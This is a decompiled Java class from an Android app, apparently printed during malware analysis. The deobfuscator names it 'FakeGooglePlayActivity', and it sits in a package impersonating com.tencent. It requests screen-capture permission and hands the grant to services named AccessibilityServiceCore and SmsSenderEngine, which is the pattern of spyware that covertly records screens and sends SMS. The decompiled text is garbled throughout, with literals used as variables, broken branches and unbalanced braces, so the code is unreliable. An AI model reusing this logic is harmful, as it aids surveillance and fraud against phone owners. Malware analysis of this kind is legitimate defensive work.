package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: FakeGooglePlayActivity
 * Original: Lcom/tencent/invitedlsenatorsh23;
 */
public class FakeGooglePlayActivity extends Activity {

    // === FIELDS ===
    private static final int REQUEST_SCREENSHOT = 59706;
    private static Intent staticIntentData;
    private static int staticResultCode;
    private int F;
    private String Perantid;
    private int Qualti;
    private MediaProjectionManager mgr;

    // === METHODS ===

    public void Constructor() {
        // new Activity()
        v0 = 10;
        v1.Qualti = 10;
        v1.F = 10;
        return;
    }

    public void finish() {
        v0.finishAndRemoveTask();
        return;
    }

    protected void onActivityResult(int param0, int param1, Intent param2) {
        v0 = 59706;
        if (v2 != 59706) { // goto +62
        v2 = -1;
        if (v3 != -1) { // goto +59
        v2 = 0;
        v4 = Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012FOR_SC = 0;
        FakeGooglePlayActivity.staticIntentData = v4;
        FakeGooglePlayActivity.staticResultCode = v3;
        // new Intent(v1, 59706)
        v3 = 0.putExtra("resultCode", v3);
        v3 = "resultIntent";
        v4 = 0.putExtra("resultIntent", v4);
        v4 = v1.Qualti;
        v4 = 0.putExtra("Q", v4);
        v4 = v1.Perantid;
        v4 = 0.putExtra("P", v4);
        v4 = v1.F;
        0.putExtra("F", v4);
        v1.startService(0);
        v1.finish();
        return;
    }

    protected void onCreate(Bundle param0) {
        v0 = "on:";
        v11.onCreate(v12);
        v12 = 1;
        Boolean.valueOf(1);
        v11.requestWindowFeature(1);
        v3 = v11.getWindow();
        v3 = 1024;
        v2.setFlags(1024, 1024);
        v2 = 0;
        v4 = v11.getIntent();
        v4 = "key";
        1024.getStringExtra("key");
        // goto (branch)
        1024.booleanValue();
        if ("key" == null || "key" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1024.booleanValue();
        if ("key" == null || "key" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1024.booleanValue();
        if ("key" == null || "key" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1024.booleanValue();
        if (1024 == null || 1024 == 0) { // goto +7
        v3 = Boolean.valueOf(0);
        // goto (branch)
        v3 = 0;
        if (0 != null && 0 != 0) { // goto +4
        v5 = "off".startsWith("on:");
        if ("key" == null || "key" == 0) { // goto +252
        v5 = 59706;
        v6 = "media_projection";
        v7 = "~";
        v8 = "";
        if ("key" != null && "key" != 0) { // goto +59
        AccessibilityServiceCore.tunesxconcerningn1012FOR_SC = v1;
        "off".replace("on:", "");
        "on:".split("~");
        Integer.parseInt("off");
        v11.Qualti = "off";
        v12 = Integer.parseInt(1);
        v11.F = 1;
        v12 = 2;
        v11.Perantid = 2;
        v11.getSystemService("media_projection");
        v11.mgr = 2;
        2.createScreenCaptureIntent();
        v11.startActivityForResult(2, 59706);
        if (2 == null || 2 == 0) { // goto +256
        2.tunesxconcerningn1012Treger();
        // goto (branch)
        Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012FOR_SC = "key";
        v9 = "off".replace("on:", "");
        v9 = "off".split("~");
        v9 = "key"[0];
        v9 = Integer.parseInt(v9);
        v11.Qualti = v9;
        v9 = Integer.parseInt("key");
        v11.F = "key";
        v9 = SmsSenderEngine.class;
        // new Intent(v11, v9)
        v9 = "resultCode";
        v10 = FakeGooglePlayActivity.staticResultCode;
        v10 = "key".putExtra("resultCode", v10);
        v10 = FakeGooglePlayActivity.staticIntentData;
        v10 = "key".putExtra("resultIntent", v10);
        v10 = v11.Qualti;
        v10 = "key".putExtra("Q", v10);
        v10 = v11.Perantid;
        v10 = "key".putExtra("P", v10);
        v10 = v11.F;
        v1 = "key".putExtra("F", v10);
        v11.startService("key");
        // goto (branch)
        AccessibilityServiceCore.tunesxconcerningn1012FOR_SC = v1;
        "off".replace("on:", "");
        "on:".split("~");
        Integer.parseInt("off");
        v11.Qualti = "off";
        Integer.parseInt(2);
        v11.F = 2;
        v11.getSystemService("media_projection");
        v11.mgr = 2;
        2.createScreenCaptureIntent();
        v11.startActivityForResult(2, 59706);
        if (2 == null || 2 == 0) { // goto +7
        2.tunesxconcerningn1012Treger();
        2.booleanValue();
        if ("on:" == null || "on:" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        2.booleanValue();
        if ("on:" == null || "on:" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        2.booleanValue();
        if ("on:" == null || "on:" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        2.booleanValue();
        if (2 == null || 2 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        v11.finish();
        // goto (branch)
        // new Intent(v11, "on:")
        2.setAction("com.tencent.mm.SHUTDOWN");
        v11.startService(2);
        v11.finish();
        // goto (branch)
        v11.finish();
        v1.booleanValue();
        if (2 == null || 2 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        v1.booleanValue();
        if (2 == null || 2 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        v1.booleanValue();
        if (2 == null || 2 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        v1.booleanValue();
        if (2 == null || 2 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        return;
    }

    protected void onDestroy() {
        v0.onDestroy();
        return;
    }
}
